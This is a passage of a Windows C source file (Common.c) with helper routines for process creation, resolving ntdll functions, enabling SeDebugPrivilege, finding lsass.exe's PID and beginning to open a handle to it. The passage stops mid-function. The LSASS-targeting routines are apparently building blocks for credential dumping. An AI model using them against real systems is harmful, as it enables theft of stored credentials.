/*****************************************************************************************************
*                                                                                                    *
*  File:         Common.c                                                                            *
*  Purpose:      Common functionality.                                                               *
*                                                                                                    *
******************************************************************************************************/
#include "Common.h"
#include <TlHelp32.h>
#include <winternl.h>

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    DEBUG_PRIVIELGE_NAME                                                                 *
*  Purpose:     The debug privilege name.                                                            *
*                                                                                                    *
******************************************************************************************************/
#define DEBUG_PRIVIELGE_NAME (L"SeDebugPrivilege")

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    LSASS_NAME                                                                           *
*  Purpose:     The name of lsass.exe.                                                               *
*                                                                                                    *
******************************************************************************************************/
#define LSASS_NAME (L"lsass.exe")

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    OBJECT_TYPE_PROCESS                                                                  *
*  Purpose:     Indicates an object refers to a process.                                             *
*                                                                                                    *
******************************************************************************************************/
#define OBJECT_TYPE_PROCESS (L"Process")

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    OBJECT_TYPE_INFORMATION_SIZE                                                         *
*  Purpose:     The object type information size in bytes.                                           *
*                                                                                                    *
******************************************************************************************************/
#define OBJECT_TYPE_INFORMATION_SIZE (0x1000)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    INITIAL_SYSTEM_HANDLE_INFORMATION_BUFFER_SIZE                                        *
*  Purpose:     The initial system handle information buffer size in bytes.                          *
*                                                                                                    *
******************************************************************************************************/
#define INITIAL_SYSTEM_HANDLE_INFORMATION_BUFFER_SIZE (0x1000)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    SYSTEM_PID                                                                           *
*  Purpose:     Defines the system process ID.                                                       *
*                                                                                                    *
******************************************************************************************************/
#define SYSTEM_PID (4)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    OBJECT_TYPE_INFORMATION_CLASS                                                        *
*  Purpose:     The information class for object types.                                              *
*  Remarks:     - Usually defined as ObjectTypeInformation.                                          *
*                                                                                                    *
******************************************************************************************************/
#define OBJECT_TYPE_INFORMATION_CLASS (2)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    SYSTEM_HANDLE_INFORMATION_CLASS                                                      *
*  Purpose:     The information class for getting all the system handles.                            *
*  Remarks:     - Usually defined as SystemHandleInformation.                                        *
*                                                                                                    *
******************************************************************************************************/
#define SYSTEM_HANDLE_INFORMATION_CLASS (16)

/*****************************************************************************************************
*                                                                                                    *
*  Constant:    STATUS_INFO_LENGTH_MISMATCH                                                          *
*  Purpose:     An NTSTATUS that represents a length mismatch when querying system information.      *
*  Remarks:     - Done here to avoid including ntstatus.h which includes many type redefinitions.    *
*                                                                                                    *
******************************************************************************************************/
#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

/*****************************************************************************************************
*                                                                                                    *
*  Structure:    SYSTEM_HANDLE                                                                       *
*  Purpose:      Defines a system handle context (not documented, taken from winternl.h).            *
*                                                                                                    *
******************************************************************************************************/
typedef struct _SYSTEM_HANDLE
{
    ULONG ProcessId;
    BYTE ObjectTypeNumber;
    BYTE Flags;
    USHORT Handle;
    PVOID Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

/*****************************************************************************************************
*                                                                                                    *
*  Structure:    SYSTEM_HANDLE_INFORMATION                                                           *
*  Purpose:      Defines the system handle information (not documented, taken from winternl.h).      *
*                                                                                                    *
******************************************************************************************************/
typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG HandleCount;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;


/*****************************************************************************************************
*                                                                                                    *
*  Enum:         POOL_TYPE                                                                           *
*  Purpose:      Defines pool types (not documented, taken from winternl.h).                         *
*                                                                                                    *
******************************************************************************************************/
typedef enum _POOL_TYPE
{
    NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed,
    DontUseThisType,
    NonPagedPoolCacheAligned,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS
} POOL_TYPE, *PPOOL_TYPE;

/*****************************************************************************************************
*                                                                                                    *
*  Structure:    OBJECT_TYPE_INFORMATION                                                             *
*  Purpose:      Defines object type context (not documented, taken from winternl.h).                *
*                                                                                                    *
******************************************************************************************************/
typedef struct _OBJECT_TYPE_INFORMATION
{
    UNICODE_STRING Name;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccess;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    USHORT MaintainTypeList;
    POOL_TYPE PoolType;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

/*****************************************************************************************************
*                                                                                                    *
*  Prototype     PFN_NtQuerySystemInformation                                                        *
*  Purpose:      Defines the function prototype for ntdll!NtQuerySystemInformation.                  *
*  Parameters:   - SystemInformationClass - the information class.                                   *
*                - SystemInformation - gets the system information (depending on the class).         *
*                - SystemInformationLength - the system information length in bytes.                 *
*  Returns:      A status indicating success or failure.                                             *
*                                                                                                    *
******************************************************************************************************/
typedef NTSTATUS(NTAPI* PFN_NtQuerySystemInformation)(
    __in ULONG SystemInformationClass,
    __out_bcount(SystemInformationLength) PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
);

/*****************************************************************************************************
*                                                                                                    *
*  Prototype:    PFN_NtDuplicateObject                                                               *
*  Purpose:      Defines the function prototype for ntdll!NtDuplicateObject.                         *
*  Parameters:   - SourceProcessHandle - the source process handle.                                  *
*                - SourceHandle - the source handle.                                                 *
*                - TargetProcessHandle - the target process handle.                                  *
*                - TargetHandle - the target handle.                                                 *
*                - DesiredAccess - the desired access.                                               *
*                - Attributes - the desired attributes for the new handle                            *
*                - Options - a set of flags to control the behavior of the duplication operation.    *
*  Returns:      A status indicating success or failure.                                             *
*                                                                                                    *
******************************************************************************************************/
typedef NTSTATUS(NTAPI* PFN_NtDuplicateObject)(
    __in_opt HANDLE SourceProcessHandle,
    __in_opt HANDLE SourceHandle,
    __in_opt HANDLE TargetProcessHandle,
    __out PHANDLE TargetHandle,
    __in ACCESS_MASK DesiredAccess,
    __in ULONG Attributes,
    __in ULONG Options
);

/*****************************************************************************************************
*                                                                                                    *
*  Prototype:     PFN_NtQueryObject                                                                  *
*  Purpose:      Defines the function prototype for ntdll!NtQueryObject.                             *
*  Parameters:   - ObjectHandle - the handle to query.                                               *
*                - ObjectInformationClass - the type of information we wish to query.                *
*                - ObjectInformation - gets the object information (based on the information class). *
*                - ObjectInformationLength - the information structure size in bytes.                *
*                - ReturnLength - the number of bytes written.                                       *
*  Returns:      A status indicating success or failure.                                             *
*                                                                                                    *
******************************************************************************************************/
typedef NTSTATUS(NTAPI* PFN_NtQueryObject)(
    __in_opt HANDLE ObjectHandle,
    __in ULONG ObjectInformationClass,
    __out_bcount(ObjectInformationLength) PVOID ObjectInformation,
    __in ULONG ObjectInformationLength,
    __out_opt PULONG ReturnLength
);

/*****************************************************************************************************
*                                                                                                    *
*  Function:     COMMON_RunProcess                                                                   *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
COMMON_RunProcess(
    __in __notnull PWSTR pwszCommandLine,
    __in BOOL bHideWindow,
    __in BOOL bWaitForProcess,
    __out_opt PHANDLE phProcess,
    __out_opt PDWORD pdwPid
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    STARTUPINFOW tStartupInfo = { 0 };
    PROCESS_INFORMATION tProcInfo = { 0 };
    DWORD dwCreateFlags = 0;
    DWORD dwWaitResult = WAIT_FAILED;

    // Validate arguments
    if (NULL == pwszCommandLine)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (pwszCommandLine=%p)", pwszCommandLine);
        goto lblCleanup;
    }

    // Set the startup information
    tStartupInfo.cb = sizeof(tStartupInfo);

    // Hide window
    if (bHideWindow)
    {
        tStartupInfo.dwFlags = STARTF_USESHOWWINDOW;
        tStartupInfo.wShowWindow = SW_HIDE;
        dwCreateFlags |= CREATE_NO_WINDOW;
    }

    // Create the process
    if (!CreateProcessW(NULL, pwszCommandLine, NULL, NULL, FALSE, dwCreateFlags, NULL, NULL, &tStartupInfo, &tProcInfo))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"CreateProcessW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Wait for the process
    if (bWaitForProcess)
    {
        dwWaitResult = WaitForSingleObject(tProcInfo.hProcess, INFINITE);
        if (WAIT_OBJECT_0 != dwWaitResult)
        {
            eStatus = RETSTATUS_FAILURE_MSG(L"WaitForSingleObject() failed (dwWaitResult=%lu, LastError=%lu)", dwWaitResult, GetLastError());
            goto lblCleanup;
        }
    }

    // Success
    if (NULL != phProcess)
    {
        *phProcess = tProcInfo.hProcess;
        tProcInfo.hProcess = NULL;
    }
    if (NULL != pdwPid)
    {
        *pdwPid = tProcInfo.dwProcessId;
    }
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    CLOSE_HANDLE(tProcInfo.hThread);
    CLOSE_HANDLE(tProcInfo.hProcess);

    // Return result
    return eStatus;
}


/*****************************************************************************************************
*                                                                                                    *
*  Function:     COMMON_TouchFile                                                                    *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
COMMON_TouchFile(
    __in __notnull PWSTR pwszPath
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    BOOL bDeleteFile = FALSE;

    // Validate arguments
    if (NULL == pwszPath)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (pwszPath=%p)", pwszPath);
        goto lblCleanup;
    }

    // Create the file
    hFile = CreateFileW(pwszPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"CreateFileW() failed (pwszPath=%ls, LastError=%lu)", pwszPath, GetLastError());
        goto lblCleanup;
    }
    bDeleteFile = TRUE;

    // Set the end of the file
    if (!SetEndOfFile(hFile))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"SetEndOfFile() failed (pwszPath=%ls, LastError=%lu)", pwszPath, GetLastError());
        goto lblCleanup;
    }

    // Success
    bDeleteFile = FALSE;
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    CLOSE_HANDLE(hFile);
    if (bDeleteFile)
    {
        (VOID)DeleteFileW(pwszPath);
    }

    // Return result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     common_GetOrLoadModule                                                              *
*  Purpose:      Gets an already-loaded module or attempts loads it.                                 *
*  Parameters:  - hModule - the module.                                                              *
*               - pwszModuleName - the module name.                                                  *
*               - pbModuleWasLoaded - gets whether the module was loaded upon success.               *
*  Returns:      The module handle upon success, NULL otherwise.                                     *
*  Remarks:     - Not thread-safe.                                                                   *
*                                                                                                    *
******************************************************************************************************/
__success(return > 0)
static
HMODULE
common_GetOrLoadModule(
    __in __notnull PWSTR pwszModuleName,
    __out PBOOL pbModuleWasLoaded
)
{
    HMODULE hModule = NULL;
    BOOL bModuleWasLoaded = FALSE;

    // Validate arguments
    DEBUG_ASSERT(NULL != pwszModuleName);
    DEBUG_ASSERT(NULL != pbModuleWasLoaded);

    // Try to get the module
    hModule = GetModuleHandleW(pwszModuleName);
    if (NULL == hModule)
    {
        // If the module was not found - attempt to load the library - else fail
        if (GetLastError() != ERROR_MOD_NOT_FOUND)
        {
            DEBUG_MSG(L"GetModuleHandleW() failed (pwszModuleName=%ls, LastError=%lu)", pwszModuleName, GetLastError());
            goto lblCleanup;
        }
        hModule = LoadLibraryW(pwszModuleName);
        if (NULL == hModule)
        {
            DEBUG_MSG(L"LoadLibraryW() failed (pwszModuleName=%ls, LastError=%lu)", pwszModuleName, GetLastError());
            goto lblCleanup;
        }
    }

    // Success
    *pbModuleWasLoaded = bModuleWasLoaded;

lblCleanup:

    // Return result
    return hModule;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     common_ResolveProcAddressFromModule                                                 *
*  Purpose:      Resolves an exported procedure from the given module.                               *
*  Parameters:  - hModule - the module.                                                              *
*               - pszProcName - the procedure name.                                                  *
*               - ppfnProc - gets the procedure address upon success.                                *
*  Returns:      TRUE upon success, FALSE otherwise.                                                 *
*  Remarks:     - Not thread-safe.                                                                   *
*                                                                                                    *
******************************************************************************************************/
__success(return > 0)
static
BOOL
common_ResolveProcAddressFromModule(
    __in __notnull HMODULE hModule,
    __in __notnull PSTR pszProcName,
    __out FARPROC* ppfnProc
)
{
    BOOL bResult = FALSE;
    FARPROC pfnProc = NULL;

    // Validate arguments
    DEBUG_ASSERT(NULL != hModule);
    DEBUG_ASSERT(NULL != pszProcName);
    DEBUG_ASSERT(NULL != ppfnProc);

    // Get the procedure
    pfnProc = GetProcAddress(hModule, pszProcName);
    if (NULL == pfnProc)
    {
        DEBUG_MSG(L"GetProcAddress() failed (pszProcName=%S, LastError=%lu)", pszProcName, GetLastError());
        goto lblCleanup;
    }

    // Success
    *ppfnProc = pfnProc;
    bResult = TRUE;

lblCleanup:

    // Return result
    return bResult;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     COMMON_ResolveProcAddress                                                           *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
COMMON_ResolveProcAddress(
    __in __notnull PWSTR pwszModuleName,
    __in __notnull PSTR pszProcName,
    __out FARPROC* ppfnProc
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    HMODULE hModule = NULL;
    BOOL bFreeModule = FALSE;
    FARPROC pfnProc = NULL;

    // Validate arguments
    if ((NULL == pwszModuleName) || (NULL == pszProcName) || (NULL == ppfnProc))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (pwszModuleName=%p, pszProcName=%p, ppfnProc=%p)", pwszModuleName, pszProcName, ppfnProc);
        goto lblCleanup;
    }

    // Get the module
    hModule = common_GetOrLoadModule(pwszModuleName, &bFreeModule);
    if (NULL == hModule)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"common_GetOrLoadModule failed");
        goto lblCleanup;
    }

    // Get the procedure
    if (!common_ResolveProcAddressFromModule(hModule, pszProcName, &pfnProc))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"common_ResolveProcAddressFromModule failed");
        goto lblCleanup;
    }

    // Success
    bFreeModule = FALSE;
    *ppfnProc = pfnProc;
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    if ((bFreeModule) && (NULL != hModule))
    {
        (VOID)FreeLibrary(hModule);
    }

    // Return result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     COMMON_ResolveProcAddresses                                                         *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
COMMON_ResolveProcAddresses(
    __in __notnull PWSTR pwszModuleName,
    __in_ecount(nProcs) __notnull PSTR* ppszProcNames,
    __out_ecount(nProcs) FARPROC** pppfnProcs,
    __in SIZE_T nProcs
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    HMODULE hModule = NULL;
    BOOL bFreeModule = FALSE;
    SIZE_T nCounter = 0;
    BOOL bNullifyProcs = FALSE;

    // Validate arguments
    if ((NULL == pwszModuleName) || (NULL == ppszProcNames) || (NULL == pppfnProcs) || (0 == nProcs))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (pwszModuleName=%p, ppszProcNames=%p, pppfnProcs=%p, nProcs=%Iu)", pwszModuleName, ppszProcNames, pppfnProcs, nProcs);
        goto lblCleanup;
    }

    // Get the module
    hModule = common_GetOrLoadModule(pwszModuleName, &bFreeModule);
    if (NULL == hModule)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"common_GetOrLoadModule failed");
        goto lblCleanup;
    }
    bNullifyProcs = TRUE;

    // Resolve all procedures
    for (nCounter = 0; nCounter < nProcs; nCounter++)
    {
        if (!common_ResolveProcAddressFromModule(hModule, ppszProcNames[nCounter], pppfnProcs[nCounter]))
        {
            eStatus = RETSTATUS_FAILURE_MSG(L"common_ResolveProcAddressFromModule failed for procedure name %S", ppszProcNames[nCounter]);
            goto lblCleanup;
        }
    }

    // Success
    bNullifyProcs = FALSE;
    bFreeModule = FALSE;
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Nullify the results if required to do so
    if (bNullifyProcs)
    {
        ZeroMemory(pppfnProcs, sizeof(*pppfnProcs) * nProcs);
    }

    // Free resources
    if ((bFreeModule) && (NULL != hModule))
    {
        (VOID)FreeLibrary(hModule);
    }

    // Return result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     COMMON_SetDebugPrivilege                                                            *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
COMMON_SetDebugPrivilege(VOID)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    TOKEN_PRIVILEGES tPrivs = { 0 };
    HANDLE hToken = NULL;

    // Open the current process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"OpenProcessToken() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Lookup the debug privilege
    if (!LookupPrivilegeValueW(NULL, DEBUG_PRIVIELGE_NAME, &(tPrivs.Privileges[0].Luid)))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"LookupPrivilegeValueW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Prepare the privilege structure
    tPrivs.PrivilegeCount = 1;
    tPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Enable the privilege or disable all privileges
    if (!AdjustTokenPrivileges(hToken, FALSE, &tPrivs, sizeof(tPrivs), NULL, NULL))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"AdjustTokenPrivileges() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Validate privileges were assigned
    // Even though there is only one privilege to be assigned - we protectively check
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"The token does not have the specified privilege");
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    CLOSE_HANDLE(hToken);

    // Return result
    return eStatus;
}


/*****************************************************************************************************
*                                                                                                    *
*  Function:     COMMON_GetDirectoryFromFullPath                                                     *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
COMMON_GetDirectoryFromFullPath(
    __in __notnull PWSTR pwszFullPath,
    __out_ecount(cchDirectoryPath) PWSTR pwszDirectoryPath,
    __in SIZE_T cchDirectoryPath
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    PWSTR pwszLastSep = NULL;
    SIZE_T cbBytes = 0;

    // Validate arguments
    if ((NULL == pwszFullPath) || (NULL == pwszDirectoryPath))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (pwszFullPath=%p, pwszDirectoryPath=%p)", pwszFullPath, pwszDirectoryPath);
        goto lblCleanup;
    }

    // Get the last separator
    pwszLastSep = wcsrchr(pwszFullPath, L'\\');
    if (NULL == pwszLastSep)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Cannot extract separator from path (pwszFullPath=%s)", pwszFullPath);
        goto lblCleanup;
    }

    // Conclude the amount of bytes to copy (including NUL terminator)
    cbBytes = (pwszLastSep - pwszFullPath + 1) * sizeof(*pwszFullPath);
    if (cchDirectoryPath * sizeof(*pwszFullPath) < cbBytes)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Not enough space to store directory (cbBytes=%Iu)", cbBytes);
        goto lblCleanup;
    }

    // Copy the bytes to the directory path
    // Note the calculation is in bytes - we copy all bytes besides the last wide character - which is why we substract sizeof(*pwszDirectoryPath)
    // Finally we assign a wide NUL terminator
    CopyMemory(pwszDirectoryPath, pwszFullPath, cbBytes - sizeof(*pwszDirectoryPath));
    pwszDirectoryPath[(cbBytes / sizeof(*pwszDirectoryPath)) - 1] = L'\0';

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Return result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     COMMON_GetRunningServicePid                                                         *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
COMMON_GetRunningServicePid(
    __out PDWORD pdwPid,
    __in __notnull PWSTR pwszServiceName
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    SC_HANDLE hScm = NULL;
    SC_HANDLE hService = NULL;
    SERVICE_STATUS_PROCESS tProcInfo = { 0 };
    DWORD bytesNeeded = 0;

    // Validate arguments
    if ((NULL == pdwPid) || (NULL == pwszServiceName))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (pdwPid=%p, pwszServiceName=%p)", pdwPid, pwszServiceName);
        goto lblCleanup;
    }

    // Open the SCM
    hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (NULL == hScm)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"OpenSCManagerW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Open the service
    hService = OpenServiceW(hScm, pwszServiceName, SERVICE_QUERY_STATUS);
    if (NULL == hService)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"OpenServiceW() failed (pwszServiceName=%ls, LastError=%lu)", pwszServiceName, GetLastError());
        goto lblCleanup;
    }

    // Query the service
    if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (PBYTE)(&tProcInfo), sizeof(tProcInfo), &bytesNeeded))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"QueryServiceStatusEx() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Success
    *pdwPid = tProcInfo.dwProcessId;
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    CLOSE_SERVICE_HANDLE(hService);
    CLOSE_SERVICE_HANDLE(hScm);

    // Return result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     COMMON_GetFirstThreadOfProcess                                                      *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
COMMON_GetFirstThreadOfProcess(
    __out PDWORD pdwThreadId,
    __in DWORD dwPid
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    BOOL bFound = FALSE;
    HANDLE hSnapshot = INVALID_HANDLE_VALUE;
    THREADENTRY32 tThreadEntry = { 0 };

    // Validate arguments
    if (NULL == pdwThreadId)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (pdwThreadId=%p)", pdwThreadId);
        goto lblCleanup;
    }

    // Create a thread snapshot
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"CreateToolhelp32Snapshot() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Get the first thread
    tThreadEntry.dwSize = sizeof(tThreadEntry);
    if (!Thread32First(hSnapshot, &tThreadEntry))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Thread32First() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Iterate all the threads
    do
    {
        if (tThreadEntry.th32OwnerProcessID == dwPid)
        {
            *pdwThreadId = tThreadEntry.th32ThreadID;
            bFound = TRUE;
            break;
        }
    } while (Thread32Next(hSnapshot, &tThreadEntry));

    // Check if we found a thread
    if (!bFound)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Was not able to find a thread for process ID %lu", dwPid);
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    CLOSE_FILE_HANDLE(hSnapshot);

    // Return result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     COMMON_IsLocalSystem                                                                *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
COMMON_IsLocalSystem(
    __out PBOOL pbIsLocalSystem
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    HANDLE hCurrentProcessToken = NULL;
    DWORD cbTokenInformationSize = 0;
    PTOKEN_USER ptTokenUser = NULL;

    // Validate arguments
    if (NULL == pbIsLocalSystem)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (pbIsLocalSystem=%p)", pbIsLocalSystem);
        goto lblCleanup;
    }

    // Get the current process token information number of required bytes
    hCurrentProcessToken = GetCurrentProcessToken();
    if (!GetTokenInformation(hCurrentProcessToken, TokenUser, NULL, 0, &cbTokenInformationSize))
    {
        if (ERROR_INSUFFICIENT_BUFFER != GetLastError())
        {
            eStatus = RETSTATUS_FAILURE_MSG(L"GetTokenInformation() failed (LastError=%lu)", GetLastError());
            goto lblCleanup;
        }
    }

    // Allocate buffer
    ptTokenUser = (PTOKEN_USER)HEAPALLOCZ(cbTokenInformationSize);
    if (NULL == ptTokenUser)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"HeapAlloc() failed allocating %lu bytes", cbTokenInformationSize);
        goto lblCleanup;
    }

    // Get the token information
    if (!GetTokenInformation(hCurrentProcessToken, TokenUser, ptTokenUser, cbTokenInformationSize, &cbTokenInformationSize))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"GetTokenInformation() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Assign the result
    *pbIsLocalSystem = IsWellKnownSid(ptTokenUser->User.Sid, WinLocalSystemSid);

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    HEAPFREE(ptTokenUser);

    // Return result
    return eStatus;
}


/*****************************************************************************************************
*                                                                                                    *
*  Function:     COMMON_FindLsassPid                                                                 *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
COMMON_FindLsassPid(
    __out PDWORD pdwPid
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    HANDLE hSnapshot = INVALID_HANDLE_VALUE;
    PROCESSENTRY32W tProcessInfo = { 0 };
    DWORD dwPid = 0;

    // Validate arguments
    if (NULL == pdwPid)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (pdwPid=%p)", pdwPid);
        goto lblCleanup;
    }

    // Snapshot all processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"CreateToolhelp32Snapshot() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Iterate processes
    tProcessInfo.dwSize = sizeof(tProcessInfo);
    if (!Process32FirstW(hSnapshot, &tProcessInfo))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Process32FirstW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }
    for (;;)
    {
        // Look for the lsass process
        if (0 == wcscmp(tProcessInfo.szExeFile, LSASS_NAME))
        {
            dwPid = tProcessInfo.th32ProcessID;
            break;
        }

        // Get the next process
        if (!Process32NextW(hSnapshot, &tProcessInfo))
        {
            if (ERROR_NO_MORE_FILES == GetLastError())
            {
                break;
            }
            DEBUG_MSG(L"Process32NextW() failed (LastError=%lu)", GetLastError());
            goto lblCleanup;
        }
    }

    // Check for success
    if (0 == dwPid)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Was not able to find process running in the system");
        goto lblCleanup;
    }

    // Success
    *pdwPid = dwPid;
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Cleanup
    CLOSE_FILE_HANDLE(hSnapshot);

    // Return result
    return eStatus;
}

/*****************************************************************************************************
*                                                                                                    *
*  Function:     common_OpenLsassProcess                                                             *
*  Purpose:      Finds the process ID of lsass.exe and opens a handle to it.                         *
*  Parameters:  - phLsassProcess - gets the process handle to lsass.exe upon success.                *
*               - pdwPid - gets the PID upon success. Optional.                                      *
*               - dwDesiredAccess - the desired access for the handle.                               *
*               - bInheritHandles - whether to allow handle inheritence or not.                      *
*  Returns:      A return status.                                                                    *
*  Remarks:     - Free the returning process handle with CloseHandle.                                *
*                                                                                                    *
*****************************************************************************************************/
__success(return >= 0)
static
RETSTATUS
common_OpenLsassProcess(
    __out PHANDLE phLsassProcess,
    __out_opt PDWORD pdwPid,
    __in DWORD dwDesiredAccess,
    __in BOOL bInheritHandles
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    DWORD dwLsassPid = 0;
    HANDLE hLsassProcess = NULL;

    // Validate arguments
    if (NULL == phLsassProcess)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (phLsassProcess=%p)", phLsassProcess);
        goto lblCleanup;
    }

    // Resolve lsass.exe PID
    eStatus = COMMON_FindLsassPid(&dwLsassPid);
    if (RETSTATUS_FAILED(eStatus))
